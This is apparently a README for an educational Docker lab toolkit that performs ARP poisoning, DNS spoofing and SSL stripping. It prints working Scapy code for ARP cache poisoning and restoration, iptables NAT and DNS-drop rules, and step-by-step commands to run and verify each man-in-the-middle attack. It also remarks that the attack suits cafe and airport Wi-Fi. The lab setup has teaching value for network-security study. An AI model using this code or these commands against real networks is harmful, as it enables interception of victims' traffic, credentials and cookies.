# Attack Tool (Educational Purpose Only)

# ARP Poisoning

> **Disclaimer:** This code and documentation are for educational purposes only. ARP Spoofing is illegal if used on networks without explicit permission. This project is intended to demonstrate how Man-in-the-Middle (MITM) attacks work and how to understand network vulnerabilities.

## Overview
This script performs an ARP Poisoning (Spoofing) attack using Python and Scapy. It establishes a Man-in-the-Middle (MITM) position by tricking a **Victim** and a **Gateway (Website/Router)** into sending their traffic through the **Attacker's** machine. This allows the attacker to intercept, view, or modify packets in transit.

For this attack to work successfully, the following conditions must be met:

1. **Same Subnet:** The Attacker, Victim, and Gateway must be on the same Local Area Network (LAN). ARP packets are broadcast only within a subnet and do not travel across routers.
2. **IP Forwarding Enabled:** The attacker's machine must be configured to forward packets. If this is disabled, the victim will lose internet connection (DoS), alerting them to the attack.
    * *Command:* `echo 1 > /proc/sys/net/ipv4/ip_forward`
3. **Dynamic ARP Caching:** The victim’s device and the gateway must use dynamic ARP caching (accepting updates), which is standard behavior for most devices.
4. **No DAI (Dynamic ARP Inspection):** The network switch must not have DAI enabled.
    * *Note:* This attack works best in public environments like cafes or airport Wi-Fi, where advanced security features like DAI are rarely implemented.

---

## Workflow of the Attack

The script follows a specific workflow to configure the network and maintain the deception.

### 1. Enable IP Forwarding & NAT
Before attacking, we must configure the Linux kernel to act like a router.

```python
def enable_ip_forwarding():
    """ Enters the commands to enable packet forwarding and NAT """
    print("[*] Enabling IP Forwarding and NAT...")
    
    # 1. Enable Forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # 2. Configure NAT (Masquerade)
    os.system(f"iptables -t nat -A POSTROUTING -o {INTERFACE} -j MASQUERADE")
    os.system(f"iptables -A FORWARD -i {INTERFACE} -j ACCEPT")
```

echo 1:
Enables Linux packet forwarding. Even if the packet is not destined for the attacker, the OS forwards it instead of dropping it.

MASQUERADE (NAT):
Performs Network Address Translation. When the attacker forwards packets to the internet, their source IP becomes the attacker's IP.

Why this matters:
Ensures the router sends return traffic back to the attacker, not directly to the victim. Without NAT, the victim might bypass the MITM.

### 2. Get MAC Address
We need the hardware addresses (MAC) to construct valid Ethernet frames.

```python

def get_mac(ip):
    """ Sends an ARP request to get the MAC address of an IP """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False, iface=INTERFACE)
    if ans:
        return ans[0][1].hwsrc
    return None
```


This part sends a broadcast ARP request ("Who has this IP?") to the entire network (ff:ff:ff:ff:ff:ff).

It waits for a reply to find the MAC address mapped to the Victim's IP and the Gateway's IP.

### 3. The Spoof 
This is the core of the attack where we corrupt the ARP cache.


```python 
def spoof(target_ip, spoof_ip, target_mac):
    """ Sends the malicious ARP packet (The 'Lie') """
    # op=2 is ARP Reply.
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False, iface=INTERFACE)
```

op=2 (ARP Reply): We use Opcode 2 to forcefully update the ARP table on the target machine, even though they never sent a request.

The Trick: We tell the Target (Victim) that the Spoof IP (Gateway) is located at OUR MAC address.

Scapy's Role: We do not specify hwsrc (Source MAC). Scapy automatically fills this with the attacker's MAC address, which completes the deception.


### 4. Running the Attack 
ARP entries expire after a short time. We must keep lying to maintain the connection.

```python 

try:
    while True:
        # Tell Victim that we are the Website
        spoof(VICTIM_IP, WEBSITE_IP, victim_mac)
        
        # Tell Website that we are the Victim
        spoof(WEBSITE_IP, VICTIM_IP, website_mac)
        
        time.sleep(2)
```

Continuous Spoofing: We enter a while True loop to continuously send packets.

Two-Way Deception: We must poison both the Victim and the Gateway to intercept full duplex traffic.

time.sleep(2): We send these packets every 2 seconds to ensure the ARP cache stays poisoned and doesn't revert to the real MAC address.


### 5. Restore (Cleanup)
When we stop the attack (Ctrl+C), we must be polite and fix the network.

```python 
def restore(dest_ip, source_ip, dest_mac, source_mac):
    # Send the CORRECT MAC address this time
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False, iface=INTERFACE)
    
```
If we simply exit, the victim will have the wrong MAC address cached and will lose internet access (DoS).

This function sends the correct MAC address (hwsrc=source_mac) to the victim and router.

We send it 4 times to ensure the packet is received and the tables are updated.

##  How to test it

Follow these steps to set up the environment, launch the ARP Spoofing attack, and verify the results.

### 1. Setup & Start Environment
Run the following command to build the Docker image and start the Attacker and Victim containers in the background.

```bash
docker-compose up -d --build
```

### 2. Launch the Attack
Open a terminal inside the **Attacker** container and run the python script.

```bash
# 1. Enter the attacker container
docker exec -it attacker bash

# 2. Run the ARP Poisoning script
# Usage: python main.py [command] [target_ip] [gateway_ip] [interface]
python main.py arp_pois 172.25.0.10 172.25.0.1 eth0
```
> **Note:** The script will run continuously. Keep this terminal open to maintain the attack.

### 3. Verify the Attack (Proof of Concept)
Open a **new terminal window** to check if the attack is working as intended.

#### A. Check ARP Spoofing (Identity Theft)
Check the **Victim's** ARP table to see if they have been fooled.

```bash
# Check Victim's ARP table
docker exec victim arp -a
```
**Success Criteria:**
1.  Look at the entry for the Gateway (`172.25.0.1`).
2.  Compare it to the Attacker's real MAC address (you can find it by running `docker exec attacker cat /sys/class/net/eth0/address`).
3.  If the **Gateway's MAC address** in the victim's table matches the **Attacker's MAC address**, the spoofing is successful.

#### B. Check Packet Delivery (Man-in-the-Middle)
Ensure that IP forwarding is enabled and the victim's traffic is being routed through the attacker correctly (not blocked).

```bash
# Ping Google DNS from the Victim container
docker exec victim ping -c 4 8.8.8.8
```
**Success Criteria:**
* You should see `64 bytes from 8.8.8.8...` (Successful replies).
* If you see "Request Timeout", IP forwarding is not working.

### 4. Cleanup
To stop the attack and remove all containers and networks:

1.  Press `Ctrl + C` in the Attacker terminal to stop the Python script.
2.  Run the following command in your main terminal:

```bash
docker-compose down
```

## Network Topology Diagram

```mermaid
graph TD
    %% Node Definitions
    Internet((External WAN<br>Public DNS: 8.8.8.8))

    %% Subgraph: Docker Internal Bridge Network
    subgraph LocalNet ["🔒 User-Defined Bridge Network"]
        style LocalNet fill:#f4f7f6,stroke:#333,stroke-width:2px,color:#2c3e50
        
        %% 네트워크 정보 노드 
        NetInfo["ℹ️ Network Config<br>CIDR: 172.25.0.0/16"]
        style NetInfo fill:#fff,stroke-dasharray: 5 5,stroke:#999,color:#555

        %% Nodes
        Gateway["Virtual Default Gateway<br>IP: 172.25.0.1<br>Role: Packet Forwarding & Routing"]
        Victim["Target Host (Victim)<br>IP: 172.25.0.10<br>State: ARP Cache Poisoned"]
        Attacker["Adversary Node (Attacker)<br>IP: 172.25.0.20<br>Role: MITM"]

        %% Connections
        Victim <==>|"L2 Adjacency<br>(Broadcast Domain)"| Attacker
        Victim -.->|"Intended Traffic Path"| Gateway
        Attacker <==>|"Intercepted Traffic Path"| Gateway
    end

    %% Edge Connection
    Gateway ===>|"NAT"| Internet

    %% Styling
    style Gateway fill:#fff3cd,stroke:#ffc107,stroke-width:2px,color:#333
    style Victim fill:#d1e7dd,stroke:#198754,stroke-width:2px,color:#333
    style Attacker fill:#f8d7da,stroke:#dc3545,stroke-width:2px,color:#333
    style Internet fill:#e2e3e5,stroke:#6c757d,color:#333
```


## How to Test DNS Spoofing

Follow these steps to set up the environment, launch the DNS Spoofing attack, and verify the results.

### 1. Setup & Start Environment
Run the following command to build the Docker image and start the Attacker and Victim containers in the background.

```bash
docker-compose up -d --build
```

### 2. Prepare the Attack (Terminal 1 & 2)
DNS Spoofing relies on **ARP Poisoning** to intercept traffic and **iptables** to block the real DNS response. This requires multiple terminals.

#### A. Enable ARP Poisoning (Terminal 1)
Open a terminal inside the **Attacker** container and run the ARP poisoning script.

```bash
# 1. Enter the attacker container
docker exec -it attacker bash

# 2. Run the ARP Poisoning script
# Usage: python main.py arp_pois [target_ip] [gateway_ip] [interface]
python main.py arp_pois 172.25.0.10 172.25.0.1 eth0
```
> **Note:** The script will run continuously. Keep this terminal open to maintain the MITM position.

#### B. Block Real DNS (Terminal 2)
To win the race condition against Google's DNS (8.8.8.8), we must block the real packet forwarding.

```bash
# Run this command ONCE in a new terminal (Host machine)
docker exec attacker iptables -I FORWARD -p udp --dport 53 -j DROP
```

### 3. Launch DNS Spoofing (Terminal 2)
In the same terminal where you ran the iptables command (or a new one), start the DNS Spoofer.

```bash
# 1. Enter the attacker container (if not already inside)
docker exec -it attacker bash

# 2. Run the DNS Spoofing script
# Usage: python main.py dns_spoof [target_domain] [fake_ip] [interface]
python main.py dns_spoof wow.hacker.test 172.25.0.20 eth0
```
> **Note:** The script will wait silently (`Listening...`) until the victim makes a request.

### 4. Verify the Attack (Proof of Concept)
Open a **new terminal window (Terminal 3)** to check if the attack is working as intended.

#### A. Check DNS Resolution (The Lie)
Check if the **Victim's** DNS query resolves to the fake IP.

```bash
# Ask the Victim to find the target domain
docker exec victim nslookup wow.hacker.test 8.8.8.8
```
**Success Criteria:**
1.  Look at the `Address` field in the output.
2.  Compare it to the Attacker's IP (`172.25.0.20`) and the real DNS Server (`8.8.8.8`).
3.  If the **Address** shows **`172.25.0.20`**, the victim has accepted the spoofed record.

#### B. Check Packet Delivery (Connectivity)
Verify if the victim actually tries to connect to the Attacker instead of the real server.

```bash
# Ping the target domain from the Victim container
docker exec victim ping -c 2 wow.hacker.test
```
**Success Criteria:**
* You should see `PING wow.hacker.test (172.25.0.20)...`.
* If you see `Name does not resolve` or the real public IP, check if the **iptables** rule from step 2-B is active.

### 5. Cleanup
To stop the attack and remove all containers and networks:

1.  Press `Ctrl + C` in Terminals 1 and 2 to stop the scripts.
2.  Run the following command in your main terminal:

```bash
docker-compose down
```

## Network Topology Diagram(DNS spoffing)

```mermaid
graph TD
    %% Node Definitions
    RealDNS((Internet WAN<br>Real DNS Server: 8.8.8.8))

    %% Subgraph: Docker Internal Bridge Network
    subgraph LocalNet ["🔒 User-Defined Bridge Network (172.25.0.0/16)"]
        style LocalNet fill:#f4f7f6,stroke:#333,stroke-width:2px,color:#2c3e50
        
        %% Nodes
        Gateway["Gateway (172.25.0.1)<br>Packet Forwarding"]
        Victim["Target (Victim)<br>IP: 172.25.0.10"]
        Attacker["Adversary (Attacker)<br>IP: 172.25.0.20<br>Role: DNS Spoofer"]

        %% Flow: Victim Request
        Victim -- "1. DNS Query: 'Where is google.com?'<br>(Dest: 8.8.8.8)" --> Attacker

        %% Flow: Attacker Action (Block & Spoof)
        Attacker -- "2. 🛑 BLOCK Real Request<br>(iptables DROP)" --> Gateway
        Attacker -- "3. 💀 FAKE Response: 'It is 172.25.0.20'<br>(Scapy Injection)" --> Victim
    end

    %% Edge Connection (Blocked path)
    Gateway -.-> |"❌ Traffic Dropped by Attacker"| RealDNS

    %% Styling
    style Gateway fill:#fff3cd,stroke:#ffc107,stroke-width:2px,color:#333
    style Victim fill:#d1e7dd,stroke:#198754,stroke-width:2px,color:#333
    style Attacker fill:#f8d7da,stroke:#dc3545,stroke-width:2px,color:#333
    style RealDNS fill:#e2e3e5,stroke:#6c757d,color:#333

    %% Link Styling
    linkStyle 3 stroke:#dc3545,stroke-width:3px,color:red;
```


# SSL Stripping Attack Tool

> **Disclaimer:** This code and documentation are for educational purposes only. SSL Stripping is illegal if used on networks without explicit permission. This project demonstrates how insecure HTTP connections and improper HTTPS enforcement can be exploited to compromise user security.

## Overview
SSL Stripping is an attack technique that forces a victim to communicate with a website over **unencrypted HTTP** instead of **secure HTTPS**, without the victim noticing. 
While the victim believes they are using a secure connection, the attacker intercepts and relays traffic, maintaining a secure HTTPS connection only between themselves and the legitimate server.

By removing or modifying HTTPS redirects, the attacker prevents the victim’s browser from upgrading the connection to HTTPS.
This allows the attacker to **read**, **modify**, or **inject** content into the victim’s web traffic, including login credentials, cookies, and sensitive data.

SSL Stripping is commonly used as part of a **Man-in-the-Middle (MITM)** attack and is often combined with techniques such as 
ARP spoofing or DNS spoofing to position the attacker between the victim and the target website.

---

## Preconditions
For SSL Stripping to work successfully, the following conditions must be met:

1. **Man-in-the-Middle Position:**  
   The attacker must be able to intercept and forward traffic between the victim and the server.  
   This is typically achieved using techniques such as ARP spoofing or rogue access points.

2. **Initial HTTP Connection or Redirect:**  
   The victim must initially access the website over HTTP or rely on an HTTP-to-HTTPS redirect.  
   If the site is accessed directly via HTTPS, SSL stripping is not possible.

3. **No HSTS (HTTP Strict Transport Security):**  
   The target website must not enforce HSTS.  
   HSTS forces browsers to always use HTTPS and prevents downgrade attacks.

4. **User Does Not Verify HTTPS Indicators:**  
   The victim must not notice missing HTTPS indicators such as:
   - the lock icon,
   - the `https://` prefix,
   - browser security warnings.

5. **No HTTPS Preloading:**  
   Websites included in browser HTTPS preload lists cannot be downgraded to HTTP, making SSL stripping ineffective against them.

---

## How to Run the SSL Stripping Lab

Follow these steps to set up the environment, launch the DNS Spoofing attack, and verify the results.

### 1. Setup & Start Environment
Initialize the isolated Docker network. This will build the containers and set up the routing rules.

```bash
# Clean up previous containers
docker-compose down

# Build and start the environment
docker-compose up -d --build
```

### 2.Verify Original Server Content
Before the attack, confirm that the target website is securely configured with HTTPS links.
```bash
docker exec ssl_stripping-webserver-1 cat /usr/share/nginx/html/index.html
```
Check Point: Verify the output contains <a href="https://www.google.com">.


### 3. Launch the attack
Start the SSL Stripping script on the attacker node. This script uses NetfilterQueue and Scapy to intercept packets.

```bash
docker exec -it ssl_stripping-attacker-1 python /app/ssl_stripping.py
```
Output: You should see [*] Listening for packets.... Keep this terminal open.

### 4. Victim Connection
Open a new terminal and simulate the victim accessing the website. Note that the victim initiates the connection via HTTP (e.g., typing the address without https or clicking a non-secure link).


```bash
docker exec ssl_stripping-victim-1 curl http://192.168.10.100
```


### 5. Verify Attack Success
Check the HTML output received by the victim in the Step 4 terminal.

Expected Result (Compromised):
```bash
<a href="http:// www.google.com">
    <button>Login (Secure HTTPS)</button>
</a>
```
Observation:

The protocol is downgraded from https:// to http://.

There is an extra space after the protocol (http:// ).


## Network Topology Diagram(SSL Striping)

```mermaid
graph LR
    subgraph Client_Network ["&nbsp;&nbsp;&nbsp;&nbsp; 🔒 Client Network (10.0.0.0/24) &nbsp;&nbsp;&nbsp;&nbsp;"]
        direction TB
        Victim(User / Victim<br/>10.0.0.10)
    end

    subgraph Server_Network ["&nbsp;&nbsp;&nbsp;&nbsp; 🌍 Server Network (192.168.10.0/24) &nbsp;&nbsp;&nbsp;&nbsp;"]
        direction TB
        Webserver(Bank Server<br/>192.168.10.100)
    end

    %% Attacker acts as a Router connecting both
    Attacker{{"☠️ Attacker (MITM)<br/>(Gateway & Router)"}}

    %% Connections
    Victim -- "Gateway: 10.0.0.20" --> Attacker
    Attacker -- "Forwarding Traffic" --> Webserver

    %% Styling
    style Victim fill:#e1f5fe,stroke:#01579b,stroke-width:2px
    style Webserver fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px
    style Attacker fill:#ffebee,stroke:#c62828,stroke-width:4px
```

